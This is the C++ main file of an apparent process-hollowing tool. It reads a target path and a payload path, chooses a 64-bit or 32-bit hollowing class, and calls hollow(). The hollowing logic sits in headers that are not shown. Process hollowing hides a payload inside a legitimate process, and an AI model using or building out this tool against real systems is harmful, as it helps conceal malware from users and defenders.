#include "HollowingFunctions.hpp"
#include "Hollowing64Bit.hpp"
#include "Hollowing32Bit.hpp"
#include <string>
#include <iostream>

template<typename T>
bool tryConstructProcessHollowing(HollowingFunctions** holderPointer, const std::string& targetPath, const std::string& payloadPath)
{
    try
    {
        *holderPointer = new T(targetPath, payloadPath);

        return true;
    }
    catch (...)
    {
        return false;
    }
}

int main(int argc, char* argv[])
{
    HollowingFunctions* hollowing = nullptr;
    std::string targetPath;
    std::string payloadPath;

    std::cout << "Enter the target's path:" << std::endl;
    std::cin >> targetPath;

    std::cout << "Enter the payload's path:" << std::endl;
    std::cin >> payloadPath;

    if (!(tryConstructProcessHollowing<Hollowing64Bit>(&hollowing, targetPath, payloadPath) ||
          tryConstructProcessHollowing<Hollowing32Bit>(&hollowing, targetPath, payloadPath)))
    {
        std::cerr << "The images are not compatible!" << std::endl;

        return 1;
    }
    
    hollowing->hollow();

    return 0;
}